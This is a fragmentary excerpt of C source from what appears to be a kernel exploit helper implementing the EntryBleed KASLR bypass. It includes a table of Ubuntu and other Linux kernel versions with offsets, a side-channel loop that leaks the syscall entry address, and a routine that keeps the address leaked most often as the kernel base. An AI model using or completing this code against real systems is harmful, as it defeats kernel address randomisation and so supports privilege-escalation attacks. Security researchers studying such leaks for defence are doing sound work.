...
struct kernel_info offsets[] = {
    ...
    {"4.20.12 #1 SMP Mon Feb 25 20:42:55 CST 2019",                                                0xa00000, 0xe00000},
    ...
    {"5.4.0-100-generic #113-Ubuntu SMP Thu Feb 3 18:43:29 UTC 2022",                              0xc00010, 0x1000000},
    ...
    {"5.15.0-58-generic #64-Ubuntu SMP Thu Jan 5 11:43:13 UTC 2023",                               0xe00000, 0x1200000},
...
uint64_t leak_syscall_entry(uint64_t offset)
{
  ...
  int i;
  for (i = 0; i < iteration + dummy_iterations; i++)
  {
    uint64_t idx;
...
struct result
{
  unsigned long *possible_addr;
  uint16_t count;
};

uint64_t result_hash(const void *item, uint64_t seed0, uint64_t seed1)
{
  const struct result *result = item;
  return hashmap_sip(&result->possible_addr, sizeof(unsigned long), seed0, seed1);
}

int result_compare(const void *a, const void *b, void *udata) {
    const struct result *ra = a;
    const struct result *rb = b;
    return !(ra->possible_addr == rb->possible_addr);
}

// bool result_iter(const void *item, void *udata) {
//     const struct result *result = item;
//     printf("%d (age=%d)\n", *(result->possible_addr), result->count);
//     return true;
// }
...
unsigned long get_kernel_addr_entrybleed()
{
  ...
  struct hashmap *map = hashmap_new(sizeof(struct result), 0, 0, 0, result_hash, result_compare, NULL, NULL);

  for (i = 0; i < iterations; i++)
  {
    struct result *tmp;
    unsigned long addr = leak_syscall_entry(offset);
    tmp = hashmap_get(map, &(struct result){.possible_addr = addr});
    if (tmp)
    {
      tmp->count++;
    }
    ...
    {
      hashmap_set(map, &(struct result){.possible_addr = addr, .count = 1});
    }
  }
  size_t iter = 0;
  void *item;
  ...
  {
    const struct result *result = item;
    printf("[*] address: %#x (count=%u)\n", result->possible_addr, result->count);
    if (result->count > count)
    {
      count = result->count;
      best = result->possible_addr;
    }
  }
  hashmap_free(map);
  return best;
